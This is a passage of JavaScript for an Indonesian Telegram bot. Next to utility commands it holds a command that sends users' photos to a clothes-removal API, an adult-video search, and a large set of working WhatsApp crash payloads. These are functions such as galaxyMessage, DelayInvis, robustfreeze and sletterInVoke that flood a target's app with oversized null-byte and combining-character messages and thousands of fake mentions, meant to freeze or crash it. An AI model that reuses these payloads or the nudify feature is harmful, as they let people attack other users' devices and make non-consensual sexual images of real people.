    fileId = photos[photos.length - 1].file_id; // resolusi tertinggi
    fileName = `photo_${Date.now()}.jpg`;
  } else if (repliedMsg.video) {
    fileId = repliedMsg.video.file_id;
    fileName = `video_${Date.now()}.mp4`;
  }

  try {
    const processingMsg = await bot.sendMessage(chatId, `⏳ ᴍᴇɴɢᴜᴘʟᴏᴀᴅ ᴋᴇ ᴄᴀᴛʙᴏx...`, { parse_mode: "Markdown", reply_to_message_id: msg.message_id });

    const file = await bot.getFile(fileId);
    const fileLink = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;

    const fileResponse = await axios.get(fileLink, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(fileResponse.data);

    // Upload ke Catbox
    const form = new FormData();
    form.append('reqtype', 'fileupload');
    form.append('fileToUpload', buffer, {
      filename: fileName,
      contentType: fileResponse.headers['content-type'],
    });

    const { data: catboxUrl } = await axios.post('https://catbox.moe/user/api.php', form, {
      headers: form.getHeaders()
    });

    // Validasi URL
    if (!catboxUrl.startsWith('https://')) {
      throw new Error('Catbox tidak mengembalikan URL yang valid');
    }

    await bot.editMessageText(`✅ ᴜᴘʟᴏᴀᴅ ʙᴇʀʜᴀꜱɪʟ!\n\n📎 URL: \`${catboxUrl}\``, {
      chat_id: chatId,
      parse_mode: "Markdown",
      message_id: processingMsg.message_id
    });

  } catch (error) {
    console.error("Upload error:", error?.response?.data || error.message);
    bot.sendMessage(chatId, "❌ Gagal mengupload file ke Catbox");
  }
});

bot.onText(/^\/Xnxx(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const query = match[1];
  const randomImage = getRandomImage();

  try {
    const res = await axios.get(`https://restapi-v2.simplebot.my.id/search/xnxx?q=${encodeURIComponent(query)}`);

    if (!res.data.status || !res.data.result || res.data.result.length === 0) {
      return bot.sendMessage(chatId, '❌ Tidak ada hasil ditemukan.');
    }

    const results = res.data.result.slice(0, 5); // Batasi 5 hasil pertama
    let responseText = `🔍 Hasil pencarian untuk *"${query}"*:\n\n`;

    results.forEach((video, index) => {
      responseText += `🎬 *${video.title.trim()}*\n` +
                      `📹 ${video.info.replace(/\n/g, ' ').trim()}\n` +
                      `🔗 [Tonton Video](${video.link})\n\nᴄʀᴇᴀᴛᴇ ʙʏ sʏᴘᴏsɪᴇ⸙`;
    });

    await bot.sendMessage(chatId, responseText, { parse_mode: 'Markdown' });

  } catch (error) {
    console.error('Gagal fetch:', error.message);
    bot.sendMessage(chatId, '❌ Gagal mengambil hasil. Coba lagi nanti.');
  }
});

bot.onText(/^\/GetCode(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;

  try {
    const replied = msg.reply_to_message;
    const fromReply = replied?.text || replied?.caption || "";
    const fromArgs = match[1] || "";
    const rawInput = (fromReply || fromArgs || "").trim();

    if (!rawInput) {
      return bot.sendMessage(
        chatId,
        "❗ Cara pakai:\nBalas pesan link lalu ketik /gethtml\nAtau: /gethtml https://contoh.com"
      );
    }

    const url = extractFirstUrl(rawInput);
    if (!url) return bot.sendMessage(chatId, "❌ Link tidak valid.");

    const notice = await bot.sendMessage(chatId, "⏳ Mengambil halaman full (inline CSS/JS)…");

    const res = await axios.get(url, {
      responseType: "text",
      timeout: 30000,
      headers: { "User-Agent": "Mozilla/5.0 (TelegramBot)" },
    });

    let html = res.data;
    const $ = cheerio.load(html);

    // 🔹 Inline semua CSS eksternal
    const cssLinks = $("link[rel=stylesheet]");
    for (let i = 0; i < cssLinks.length; i++) {
      const href = $(cssLinks[i]).attr("href");
      if (href) {
        try {
          const absUrl = new URL(href, url).href;
          const cssRes = await axios.get(absUrl);
          $(cssLinks[i]).replaceWith(`<style>\n${cssRes.data}\n</style>`);
        } catch (e) {
          console.error("CSS gagal:", href, e.message);
        }
      }
    }

    // 🔹 Inline semua JS eksternal
    const scripts = $("script[src]");
    for (let i = 0; i < scripts.length; i++) {
      const src = $(scripts[i]).attr("src");
      if (src) {
        try {
          const absUrl = new URL(src, url).href;
          const jsRes = await axios.get(absUrl);
          $(scripts[i]).replaceWith(`<script>\n${jsRes.data}\n</script>`);
        } catch (e) {
          console.error("JS gagal:", src, e.message);
        }
      }
    }

    html = $.html();

    const { hostname } = new URL(url);
    const filename = `${hostname}.html`;
    const savePath = path.join(process.cwd(), "Temp", filename);
    await fs.ensureDir(path.dirname(savePath));
    await fs.writeFile(savePath, html);

    const sizeKB = (Buffer.byteLength(html) / 1024).toFixed(1);
    const caption =
      `✅ Berhasil ambil halaman\n🔗 URL: ${url}\n📄 File: ${filename}\n📏 Size: ${sizeKB} KB\n\n` +
      `Semua CSS & JS sudah inline, tidak ada encode.`;

    await bot.sendDocument(chatId, savePath, { caption });

    // hapus pesan "loading"
    bot.deleteMessage(chatId, notice.message_id).catch(() => {});
    // hapus file sementara
    setTimeout(() => fs.remove(savePath).catch(() => {}), 15000);

  } catch (err) {
    console.error("gethtml error:", err.message || err);
    bot.sendMessage(chatId, "❌ Gagal mengambil HTML. Pastikan link valid & bisa diakses.");
  }
});

function extractFirstUrl(text) {
  const hasScheme = /^https?:\/\//i.test(text.trim());
  const maybeUrl = hasScheme ? text.trim() : "https://" + text.trim();
  const re = /(https?:\/\/[^\s]+)/ig;
  const match = re.exec(maybeUrl);
  if (!match) return null;
  try {
    return new URL(match[1]).toString();
  } catch {
    return null;
  }
}

// 🔧 Fungsi pembuat progress bar
function createProgressBar(percent) {
  const total = 10;
  const filled = Math.round((percent / 100) * total);
  return "[" + "█".repeat(filled) + "░".repeat(total - filled) + `] ${percent}%`;
}

// 🔧 Fungsi update progress message
async function updateProgress(chatId, messageId, percent, status) {
  const text =
    "```css\n" +
    "🔒 EncryptBot\n" +
    ` ⚙️ ${status} (${percent}%)\n` +
    ` ${createProgressBar(percent)}\n` +
    "```\n" +
    "PROSES ENCRYPT BY SYPOSIE";

  await bot.editMessageText(text, {
    chat_id: chatId,
    message_id: messageId,
    parse_mode: "Markdown",
  });
}

// 🔹 Perintah utama
bot.onText(/^\/EncryptHtml(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const replyMsg = msg.reply_to_message;
  const customName = match[1]?.trim() || "Syposie";

  try {
    if (!replyMsg?.document) {
      return bot.sendMessage(chatId, "❌ Balas file `.html` untuk dienkripsi.");
    }

    const file = replyMsg.document;
    if (!file.file_name.endsWith(".html")) {
      return bot.sendMessage(chatId, "❌ File harus berformat `.html`");
    }

    const tempDir = path.join(process.cwd(), "tmp");
    await fs.ensureDir(tempDir);

    const outputFile = path.join(tempDir, `${customName}.html`);

    // Pesan awal
    const progressMsg = await bot.sendMessage(
      chatId,
      "```css\n" +
        "🔒 EncryptBot\n" +
        " ⚙️ Memulai Enkripsi HTML (1%)\n" +
        ` ${createProgressBar(1)}\n` +
        "```\n" +
        "PROSES ENCRYPT BY SMILE",
      { parse_mode: "Markdown" }
    );

    const progressId = progressMsg.message_id;

    // Ambil file dari Telegram
    const fileLink = await bot.getFileLink(file.file_id);
    await updateProgress(chatId, progressId, 10, "Mengunduh");

    const response = await fetch(fileLink);
    const htmlContent = await response.text();

    await updateProgress(chatId, progressId, 20, "Mengunduh Selesai");

    // Encode base64
    await updateProgress(chatId, progressId, 40, "Encoding Base64");
    const base64Encoded = Buffer.from(htmlContent, "utf8").toString("base64");

    const resultScript = `<!DOCTYPE html>
<html>
<head><meta charset="utf-8"><title>Encrypted HTML</title></head>
<body>
<script>
document.write(atob("${base64Encoded}"))
</script>
</body>
</html>`;

    await updateProgress(chatId, progressId, 70, "Menyimpan Hasil");
    await fs.writeFile(outputFile, resultScript);

    await bot.sendDocument(chatId, outputFile, {
      filename: `SyposieObf_${file.file_name}`,
      caption: `✅ *File HTML terenkripsi base64*\nGunakan hanya di browser.\nNama: \`${customName}\``,
      parse_mode: "Markdown",
    });

    await updateProgress(chatId, progressId, 100, "Selesai");

    // Hapus file sementara
    setTimeout(() => fs.remove(outputFile).catch(() => {}), 15000);

  } catch (err) {
    console.error("Explosion error:", err);
    bot.sendMessage(chatId, "❌ Terjadi kesalahan saat enkripsi file.");
  }
});
bot.onText(/\/Iqc(.+)?/, async (msg, match) => {
  const chatId = msg.chat.id;
    
  const text = match[1] ? match[1].trim() : '';

  if (!text) {
    return bot.sendMessage(chatId, '❌ Format Salah: /iqc jam|batre|carrier|pesan\nContoh: /iqc 18:00|40|Indosat|hai hai', {
      reply_to_message_id: msg.message_id
    });
  }

  const parts = text.split('|');
  if (parts.length < 4) {
    return bot.sendMessage(chatId, '❌ Format salah! Gunakan:\n/iqc jam|batre|carrier|pesan\nContoh:\n/iqc 18:00|40|Indosat|hai hai', {
      reply_to_message_id: msg.message_id
    });
  }

  const time = parts[0].trim();
  const battery = parts[1].trim();
  const carrier = parts[2].trim();
  const messageParts = parts.slice(3);
  const messageText = messageParts.join('|').trim();

  if (!time || !battery || !carrier || !messageText) {
    return bot.sendMessage(chatId, '⚠️ Format salah! Pastikan semua field terisi:\n/iqc jam|batre|carrier|pesan', {
      reply_to_message_id: msg.message_id
    });
  }

  const waitingMsg = await bot.sendMessage(chatId, '⏳', {
    reply_to_message_id: msg.message_id
  });

  try {
    const encodedTime = encodeURIComponent(time);
    const encodedCarrier = encodeURIComponent(carrier);
    const encodedMessage = encodeURIComponent(messageText);
    
    const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodedTime}&batteryPercentage=${battery}&carrierName=${encodedCarrier}&messageText=${encodedMessage}&emojiStyle=apple`;

    const response = await fetch(url);
    
    if (!response.ok) {
      throw new Error(`API returned status ${response.status}`);
    }

    const arrayBuffer = await response.arrayBuffer();
    const buffer = Buffer.from(arrayBuffer);

    await bot.sendPhoto(chatId, buffer, {
      caption: `✅ *ꜱᴜᴋꜱᴇꜱ ʙᴀɴɢ*`,
      parse_mode: 'Markdown',
      reply_to_message_id: msg.message_id
    });

    await bot.deleteMessage(chatId, waitingMsg.message_id);

  } catch (error) {
    console.error('Error:', error);
    
    await bot.deleteMessage(chatId, waitingMsg.message_id);
    
    await bot.sendMessage(chatId, '❌ Terjadi kesalahan, Coba lagi!', {
      reply_to_message_id: msg.message_id
    });
  }
});
bot.onText(/^\/Brat(?: (.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
    
  const argsRaw = match[1];

  if (!argsRaw) {
    return bot.sendMessage(chatId, 'Format: /brat <teks> [--gif] [--delay=500]');
  }

  try {
    const args = argsRaw.split(' ');

    const textParts = [];
    let isAnimated = false;
    let delay = 500;

    for (let arg of args) {
      if (arg === '--gif') isAnimated = true;
      else if (arg.startsWith('--delay=')) {
        const val = parseInt(arg.split('=')[1]);
        if (!isNaN(val)) delay = val;
      } else {
        textParts.push(arg);
      }
    }

    const text = textParts.join(' ');
    if (!text) {
      return bot.sendMessage(chatId, 'Teks tidak boleh kosong!');
    }

    if (isAnimated && (delay < 100 || delay > 1500)) {
      return bot.sendMessage(chatId, 'Delay harus antara 100–1500 ms.');
    }

    await bot.sendMessage(chatId, '⏳ ᴍᴇᴍʙᴜᴀᴛ sᴛɪᴄᴋᴇʀ ʙʀᴀᴛ...');

    const apiUrl = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isAnimated=${isAnimated}&delay=${delay}`;
    const response = await axios.get(apiUrl, {
      responseType: 'arraybuffer',
    });

    const buffer = Buffer.from(response.data);

    await bot.sendSticker(chatId, buffer);
  } catch (error) {
    console.error('❌ Error brat:', error.message);
    bot.sendMessage(chatId, 'Gagal membuat stiker brat. Coba lagi nanti ya!');
  }
});

bot.onText(/^\/TrackIp(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  if (!isOwner(msg.from.id)) return bot.sendMessage(chatId, '❌ Hanya owner.')
  try {
    if (!match[1]) {
      return bot.sendMessage(chatId, "ip nya mana dongo", {
        reply_to_message_id: msg.message_id,
      });
    }
    const res = await axios.get(`https://ipwhois.app/json/${match[1]}`);
    const d = res.data;
    await bot.sendMessage(chatId, "```json\n" + JSON.stringify(d, null, 2) + "```", {
        parse_mode: "Markdown",
        reply_to_message_id: msg.message_id,
      });
  } catch (err) {
    bot.sendMessage(chatId, err.message, {
      reply_to_message_id: msg.message_id,
    });
  }
});

bot.onText(/^\/Tonaked$/i, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  let imageUrl = null;

  // Jika command direply ke foto
  if (msg.reply_to_message && msg.reply_to_message.photo) {
    const fileId = msg.reply_to_message.photo.pop().file_id;
    const file = await bot.getFile(fileId);
    imageUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;
  }

  if (!imageUrl) {
    return bot.sendMessage(chatId, '⚠️ Reply ke foto untuk memproses gambar.');
  }

  // Kirim pesan status
  const statusMsg = await bot.sendMessage(chatId, '⏳ Memproses gambar...');

  try {
    const res = await fetch(`https://api.nekolabs.my.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`);
    const data = await res.json();
    const hasil = data.result;

    if (!hasil) {
      return bot.editMessageText('❌ Gagal memproses gambar. Pastikan URL atau foto valid.', {
        chat_id: chatId,
        message_id: statusMsg.message_id
      });
    }

    // Hapus pesan status
    await bot.deleteMessage(chatId, statusMsg.message_id);

    // Kirim hasil foto
    await bot.sendPhoto(chatId, hasil, { caption: '✅ Berhasil diproses!' });

  } catch (err) {
    console.error(err);
    await bot.editMessageText('❌ Terjadi kesalahan saat memproses gambar.', {
      chat_id: chatId,
      message_id: statusMsg.message_id
    });
  }
});

//file buat update script yang baru disini
const Js_Oriii = "/home/container/Yandex.js";
const Ghlu = "https://raw.githubusercontent.com/nothing424/Syposie/main/Yandex.js";

const Json_Oriii = "/home/container/package.json";
const Ghpackage = "https://raw.githubusercontent.com/nothing424/Syposie/main/package.json";

bot.onText(/^\/Update$/i, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    // ❌ BUKAN OWNER
    if (!isOwner(userId)) {
        return bot.sendMessage(chatId, "❌ Owner Only!");
    }

    // ✅ OWNER
    bot.sendMessage(chatId, "🔄 Mengambil update terbaru...");

    try {
        // --- UPDATE YANDEX.JS ---
        const resJs = await axios.get(Ghlu, { responseType: "text" });
        const newJsCode = resJs.data.toString();

        if (fs.existsSync(Js_Oriii)) fs.unlinkSync(Js_Oriii);
        fs.writeFileSync(Js_Oriii, newJsCode, "utf8");

        // --- UPDATE PACKAGE.JSON ---
        const resPkg = await axios.get(Ghpackage, { responseType: "text" });
        const newPkgCode = resPkg.data.toString();

        if (fs.existsSync(Json_Oriii)) fs.unlinkSync(Json_Oriii);
        fs.writeFileSync(Json_Oriii, newPkgCode, "utf8");

        // SUCCESS
        await bot.sendMessage(chatId, "✅ Update berhasil!\n🔁 Bot akan restart otomatis.");

        setTimeout(() => process.exit(0), 1500);

    } catch (err) {
        console.error(err);
        bot.sendMessage(chatId, "❌ Gagal update! Periksa GitHub atau file.");
    }
});

//selesai disini yak

// ------------------ ( Preset function )
async function BlankXXX(target) {
for (let i = 0; i < 39; i++) {
  await UiAttack(sock, target);
  await sletterInVoke(sock, target);
  await sleep(1500);
  }
}

// ------------------ ( Function Disini ) ------------------------ \\
async function Delaylokal(target) {
  try {
   const abimsalsa = "\u2063".repeat(6000);
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: abimsalsa, 
            },
            nativeFlowMessage: {
              buttons: [
                { name: "single_select", buttonParamsJson: "\u0005".repeat(80000) },
                { name: "cta_copy", buttonParamsJson: "\u0003".repeat(8000) },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.error(err);
  }
}
async function galaxyMessage(sock, target, mention, cta = true) {
    try {
  let ConnectMsg = await generateWAMessageFromContent(
    target,
    proto.Message.fromObject({
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false
            },
            body: {
              text: "Hallo"
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: [
                { name: "single_select", buttonParamsJson: "\u0000" },
                { name: "payment_info", buttonParamsJson: "\u0000" },
                {
                  name: "catalog_message",
                  buttonParamsJson:
                    `{\"catalog_id\":\"999999999999999\",\"product_retailer_id\":null,\"text\":\"Come On\",\"thumbnail_product_image\":\"https://files.catbox.moe/ebag6l.jpg\",\"product_sections\":[{\"title\":false,\"products\":[{\"id\":12345,\"name\":null,\"price\":\"free\",\"currency\":null,\"image\":false,\"description\":\"Order Now\"}]}],\"cta\":{\"type\":\"VIEW_CATALOG\",\"display_text\":123},\"business_info\":{\"name\":999999999,\"phone_number\":true,\"address\":[]},\"footer_text\":0}` 
                    + "\u0000".repeat(100000)
                }
              ]
            }
          }
        }
      }
    }),
    {
      message: {
        orderMessage: {
          orderId: "92828",
          thumbnail: null,
          itemCount: 9999999999999,
          status: "INQUIRY",
          surface: "CATALOG",
          message: "Order Now",
          orderTitle: "Click Here",
          sellerJid: target,
          token: "8282882828==",
          totalAmount1000: "828828292727372728829",
          totalCurrencyCode: "IDR",
          messageVersion: 1,
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from(
                { length: 3000 },
                () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
          },
        },
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      },
      ephemeralExpiration: 0,
      forwardingScore: 9999,
      isForwarded: false,
      font: Math.floor(Math.random() * 9),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
    }
  );

  await sock.relayMessage(
    "status@broadcast",
    ConnectMsg.message.viewOnceMessage.message,
    {
      messageId: ConnectMsg.key?.id || "",
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                },
              ],
            },
          ],
        },
      ],
    }
  );

  if (mention) {
    await sock.relayMessage(
      target,
      {
        groupStatusMentionMessageV2: {
          message: {
            protocolMessage: {
              key: ConnectMsg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: true },
          },
        ],
      }
    );
  }

  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        expiration: 0
      },
      body: {
        text: "Xata",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});

  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: msg.message
      }
    },
    cta
      ? { messageId: msg.key.id, participant: { jid: target } }
      : { messageId: msg.key.id }
  );
  let msg2 = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        expiration: 0
      },
      body: {
        text: "Xata",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});

  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: msg2.message
      }
    },
    cta
      ? { messageId: msg2.key.id, participant: { jid: target } }
      : { messageId: msg2.key.id }
  );

  console.log(chalk.red(`Galaxy Message ${target}`));
        } catch (err) {
    console.error(err);
  }
}
async function DelayInvis(target, mention) {
const delaymention = Array.from({ length: 30000 }, (_, r) => ({
        title: "᭡꧈".repeat(92000) + "ꦽ".repeat(92000) + "\u0000".repeat(92000),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));
 
const quotedMessage = {
    extendedTextMessage: {
        text: "᭯".repeat(12000),
        matchedText: "https://" + "ꦾ".repeat(670) + ".com",
        canonicalUrl: "https://" + "ꦾ".repeat(670) + ".com",
        description: "\u0000".repeat(550),
        title: "\u200D".repeat(1000),
        previewType: "NONE",
        jpegThumbnail: Buffer.alloc(10000), 
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            externalAdReply: {
                showAdAttribution: true,
                title: "RajaXyrine",
                body: "\u0000".repeat(10000),
                thumbnailUrl: "https://xnxx" + "ꦾ".repeat(630) + ".com",
                mediaType: 1,
                renderLargerThumbnail: true,
                sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz"
            },
            mentionedJid: Array.from({ length: 1000 }, (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
        }
    },
    paymentInviteMessage: {
        currencyCodeIso4217: "USD",
        amount1000: "999999999",
        expiryTimestamp: "9999999999",
        inviteMessage: "Payment Invite" + "💥".repeat(1770),
        serviceType: 1
    }
};
let msg = await generateWAMessageFromContent(target,  {
                buttonsMessage: {
            text: "᭯".repeat(9741),
            contentText: "\u0000",
            footerText: "\u0000",
            buttons: [
                {
                    buttonId: "\u0000".repeat(911000),
                    buttonText: { displayText: "\u0000" + "\u0000".repeat(400000) },
                    type: 1
                }, 
                {
                     buttonId: "RajaXyrine".repeat(911000), 
                     buttonText: { displayText: "\u0003" + "\u0000" + "᭯".repeat(200000) }, 
                     type: 1
                 }
            ],
            headerType: 1
        },
buttonsMessage: {
                    text: "❦",
                    contentText:
                        "Untukmu 2000tahun yang akan datang",
                    footerText: "darimu 2000tahun yang lalu",
                    buttons: [
                        {
                            buttonId: ".RajaXyrine",
                            buttonText: {
                                displayText: "Raja is maou" + "\u0000".repeat(500000),
                            },
                            type: 1,

},
                    ],
                    headerType: 1,
                },
                
           }, {});
const mentionedList = [
"13135550002@s.whatsapp.net",
...Array.from({ length: 40000 }, () =>
`1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
)
];

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "Raja Ni Dexx 🤓",
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { selectedRowId: "🔴" },
contextInfo: {
mentionedJid: Array.from({ length: 30000 }, () => 
"1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
),
participant: target,
remoteJid: "status@broadcast",
forwardingScore: 9741,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "333333333333@newsletter",
serverMessageId: 1,
newsletterName: "VoldInvis"
}
},
description: "Delayyyy Dexx 😹😂"
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2
}
};         


const embeddedMusic = {
musicContentMediaId: "589608164114571",
songId: "870166291800508",
author: ".⏤͟͟͞͞𝐑𝐚͢𝐣𝐚𝐚⃔𝐗𝐲𝐫𝐢⃭𝐧𝐞⃬⃑" + "ោ៝".repeat(10000),
title: "Finix",
artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

        const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "109951162777600",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "ꦾ".repeat(12777),
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
           externalAdReply: {
              showAdAttribution: true,
              title: `☠️ - んジェラルド - ☠️`,
              body: `${"\u0000".repeat(9117)}`,
              mediaType: 1,
              renderLargerThumbnail: true,
              thumbnailUrl: null,
              sourceUrl: `https://${"ꦾ".repeat(100)}.com/`
        },
           businessMessageForwardInfo: {
              businessOwnerJid: target,
        },
            quotedMessage: quotedMessage,
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: `${"ꦾ".repeat(100)}`
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };    {};


    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "MARK WUT WUT 😂😹" },
                    content: undefined
                }
            ]
        });
    }
}
async function robustfreeze(target, Ptcp = true) {
  try {
    await sock.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "Anafabula here 👁⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝‌\n" +
                  "ꦽ".repeat(92000) +
                  `@1`.repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Vamp",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
async function sletterInVoke(sock, target) {
  try {
    const message = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "33333333333333333@newsletter",
            newsletterName: "Hallo Izin Push Kontak" + "ી".repeat(120000),
            jpegThumbnail: "",
            caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
            inviteExpiration: Date.now() + 1814400000,
          },
        },
      },

      nativeFlowMessage: {
        messageParamsJson: "",
        buttons: [
          {
            name: "call_permission_request",
            buttonParamsJson: "{}",
          },
          {
            name: "galaxy_message",
            paramsJson: {
              screen_2_OptIn_0: true,
              screen_2_OptIn_1: true,
              screen_1_Dropdown_0: "nullOnTop",
              screen_1_DatePicker_1: "1028995200000",
              screen_1_TextInput_2: "null@gmail.com",
              screen_1_TextInput_3: "94643116",
              screen_0_TextInput_0: "\u0000".repeat(500000),
              screen_0_TextInput_1: "SecretDocu",
              screen_0_Dropdown_2: "#926-Xnull",
              screen_0_RadioButtonsGroup_3: "0_true",
              flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s.",
            },
          },
        ],
      },

      contextInfo: {
        mentionedJid: ["0@s.whatsapp.net"],
        groupMentions: [
          {
            groupJid: "0@s.whatsapp.net",
            groupSubject: "#Syonx-Tzy",
          },
        ],
      },
    };

    await sock.relayMessage(target, message, {
      userJid: target,
      participant: { jid: target },
    });

  } catch (err) {
    console.error("Error sending VampireBugIns:", err);
  }
}
async function VampireInvisIos(target) {
      sock.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "ꦾ".repeat(55000),
            contextInfo: {
              stanzaId: target,
              participant: target,
              quotedMessage: {
                conversation: "makloo" + "ꦻ࣯࣯".repeat(50000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
